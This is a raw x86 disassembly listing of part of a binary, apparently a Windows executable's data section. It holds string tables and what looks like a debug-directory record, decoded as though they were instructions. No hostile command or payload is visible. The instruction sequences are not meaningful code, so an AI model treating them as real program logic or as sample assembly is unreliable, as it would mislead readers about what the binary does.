  433963:	pop    edx
  433964:	cmp    BYTE PTR [eax],al
  433966:	inc    edi
  433967:	xor    esi,DWORD PTR ds:0x5451585f
  43396d:	dec    esp
  43396e:	add    BYTE PTR [edi+esi*1+0x34],cl
  433972:	pop    edi
  433973:	cmp    BYTE PTR [edi+0x49],dl
  433976:	xor    eax,0x5700505f
  43397b:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  43397f:	dec    esi
  433980:	dec    edx
  433981:	cmp    BYTE PTR [eax],al
  433983:	pop    edx
  433984:	dec    ebx
  433985:	xor    eax,0x4f5f3131
  43398a:	xor    dh,BYTE PTR [ecx]
  43398c:	pop    edi
  43398d:	inc    ebp
  43398e:	push   esp
  43398f:	inc    esp
  433990:	inc    ebp
  433991:	add    BYTE PTR [edi+0x55],dl
  433994:	cmp    DWORD PTR [edi+0x5a],ebx
  433997:	push   edx
  433998:	inc    edi
  433999:	xor    DWORD PTR [ebp+0x0],ecx
  43399c:	pop    edx
  43399d:	dec    ecx
  43399e:	dec    ebp
  43399f:	ss pop edi
  4339a1:	pop    edx
  4339a2:	push   edx
  4339a3:	cmp    BYTE PTR [esi+0x30],dl
  4339a6:	pop    edi
  4339a7:	push   ecx
  4339a8:	dec    esi
  4339a9:	add    BYTE PTR [ebx+0x32],dl
  4339ac:	inc    ebx
  4339ad:	cmp    BYTE PTR [edi+0x52],bl
  4339b0:	dec    ecx
  4339b1:	xor    BYTE PTR [eax],al
  4339b3:	inc    edi
  4339b4:	xor    eax,0x314f5f4b
  4339b9:	xor    DWORD PTR [edi+0x38],ebx
  4339bc:	push   ebp
  4339bd:	add    BYTE PTR [edi+0x4b],al
  4339c0:	xor    bl,BYTE PTR [edi+0x43]
  4339c3:	push   ebp
  4339c4:	cmp    DWORD PTR [ebp+0x4b],ecx
  4339c7:	ss pop edi
  4339c9:	pop    edx
  4339ca:	push   edi
  4339cb:	inc    esp
  4339cc:	xor    BYTE PTR [eax],al
  4339ce:	dec    ecx
  4339cf:	inc    edi
  4339d0:	xor    eax,0x3058555f
  4339d5:	dec    ebx
  4339d6:	pop    edi
  4339d7:	push   edi
  4339d8:	add    BYTE PTR [eax+0x0],bl
  4339db:	inc    edi
  4339dc:	add    BYTE PTR [edx+0x0],al
  4339df:	pop    edi
  4339e0:	add    BYTE PTR [ebx],dh
  4339e2:	add    BYTE PTR [eax],bh
  4339e4:	add    BYTE PTR [ebx+0x0],cl
  4339e7:	xor    eax,0x33003500
  4339ec:	add    BYTE PTR [eax],dh
  4339ee:	add    BYTE PTR [edi+0x0],bl
  4339f1:	push   esp
  4339f2:	add    BYTE PTR [ebp+0x0],cl
  4339f5:	xor    BYTE PTR [eax],al
  4339f7:	add    BYTE PTR [eax],al
  4339f9:	inc    esi
  4339fa:	add    BYTE PTR [eax+0x0],bl
  4339fd:	xor    BYTE PTR [eax],al
  4339ff:	pop    edi
  433a00:	add    BYTE PTR [ecx],dh
  433a02:	add    BYTE PTR [ebx+0x0],al
  433a05:	xor    eax,0x5f003100
  433a0a:	add    BYTE PTR [ecx+0x0],al
  433a0d:	xor    eax,DWORD PTR [eax]
  433a0f:	add    BYTE PTR [eax],al
  433a11:	push   ebx
  433a12:	add    BYTE PTR [ebx+0x0],dl
  433a15:	dec    eax
  433a16:	add    BYTE PTR [edi+0x0],bl
  433a19:	push   esp
  433a1a:	add    BYTE PTR [ebx+0x0],al
  433a1d:	push   ebx
  433a1e:	add    BYTE PTR [edx+0x0],dl
  433a21:	pop    edi
  433a22:	add    BYTE PTR [ecx+0x0],dl
  433a25:	dec    edi
  433a26:	add    BYTE PTR [edi+0x0],al
  433a29:	push   ecx
  433a2a:	add    BYTE PTR [edi+0x0],bl
  433a2d:	pop    ecx
  433a2e:	add    BYTE PTR [eax],al
  433a30:	add    BYTE PTR [edi+0x0],cl
  433a33:	dec    edi
  433a34:	add    BYTE PTR [ebp+0x0],dl
  433a37:	cmp    DWORD PTR [eax],eax
  433a39:	pop    edi
  433a3a:	add    BYTE PTR [edx],dh
  433a3c:	add    BYTE PTR [eax+eax*1+0x32],al
  433a40:	add    BYTE PTR ds:0x47005f00,dh
  433a46:	add    BYTE PTR ds:0x48000000,dh
  433a4c:	add    BYTE PTR [edx+0x0],cl
  433a4f:	push   eax
  433a50:	add    BYTE PTR [edi+0x0],bl
  433a53:	cmp    BYTE PTR [eax],al
  433a55:	add    BYTE PTR ss:0x55004100,dh
  433a5c:	add    BYTE PTR [edi+0x0],bl
  433a5f:	push   edx
  433a60:	add    BYTE PTR [edi],dh
  433a62:	add    BYTE PTR [ecx+0x0],cl
  433a65:	add    BYTE PTR [eax],al
  433a67:	inc    esp
  433a68:	add    BYTE PTR [ecx+0x0],dl
  433a6b:	inc    edx
  433a6c:	add    BYTE PTR [edi+0x0],bl
  433a6f:	push   ecx
  433a70:	add    BYTE PTR [ecx+0x0],bl
  433a73:	dec    edi
  433a74:	add    BYTE PTR [eax+0x0],dl
  433a77:	add    BYTE PTR [eax],al
  433a79:	dec    edx
  433a7a:	add    BYTE PTR [ecx+0x0],dl
  433a7d:	inc    esp
  433a7e:	add    BYTE PTR [edi+0x0],bl
  433a81:	dec    edx
  433a82:	add    BYTE PTR [eax],dh
  433a84:	add    BYTE PTR [ecx],dh
  433a86:	add    BYTE PTR [ebx+0x0],dl
  433a89:	push   ecx
  433a8a:	add    BYTE PTR [ecx],dh
  433a8c:	add    BYTE PTR [edi+0x0],bl
  433a8f:	push   edi
  433a90:	add    BYTE PTR [eax],al
  433a92:	add    BYTE PTR [ebx+0x0],cl
  433a95:	pop    edx
  433a96:	add    BYTE PTR [esi],dh
  433a98:	add    BYTE PTR [edi+0x0],bl
  433a9b:	inc    ebx
  433a9c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433aa0:	add    BYTE PTR [edi+0x0],bl
  433aa3:	push   edi
  433aa4:	add    BYTE PTR [ebx],dh
  433aa6:	add    BYTE PTR [esi+0x0],cl
  433aa9:	push   ebp
  433aaa:	add    BYTE PTR [edi+0x0],bl
  433aad:	dec    edx
  433aae:	add    BYTE PTR [eax],al
  433ab0:	add    BYTE PTR [edi+0x0],dl
  433ab3:	aaa    
  433ab4:	add    BYTE PTR [eax],bh
  433ab6:	add    BYTE PTR [edi+0x0],bl
  433ab9:	pop    eax
  433aba:	add    BYTE PTR [edi+0x0],cl
  433abd:	inc    edi
  433abe:	add    BYTE PTR [edi+0x0],bl
  433ac1:	xor    al,0x0
  433ac3:	push   eax
  433ac4:	add    BYTE PTR [ecx+0x0],cl
  433ac7:	push   ebp
  433ac8:	add    BYTE PTR [eax],al
  433aca:	add    BYTE PTR [edi+0x0],dl
  433acd:	push   esp
  433ace:	add    BYTE PTR [ebx+0x0],cl
  433ad1:	add    BYTE PTR [eax],al
  433ad3:	add    BYTE PTR [edx+0x53],dl
  433ad6:	inc    esp
  433ad7:	push   ebx
  433ad8:	aas    
  433ad9:	jge    0x433afa
  433adb:	pop    ds
  433adc:	test   al,0x1
  433ade:	cli    
  433adf:	inc    edx
  433ae0:	test   eax,0xf97e90bf
  433ae5:	in     al,dx
  433ae6:	(bad)  
  433ae7:	and    ebx,DWORD PTR [ebx]
  433ae9:	add    BYTE PTR [eax],al
  433aeb:	add    BYTE PTR [edx+edi*1+0x5c],dl
  433aef:	jns    0x433b5a
  433af1:	addr16 push edi
  433af3:	bound  bx,DWORD PTR [edx+0x45]
  433af7:	outs   dx,BYTE PTR ds:[esi]
  433af8:	pop    esp
  433af9:	je     0x433b6e
  433afb:	ja     0x433b3e
  433afd:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433b05:	js     0x433b76
  433b07:	jp     0x433b78
  433b09:	jns    0x433b6f
  433b0b:	jp     0x433b75
  433b0d:	je     0x433b73
  433b0f:	jp     0x433b73
  433b11:	cs jo  0x433b78
  433b14:	bound  eax,QWORD PTR [eax]
	...
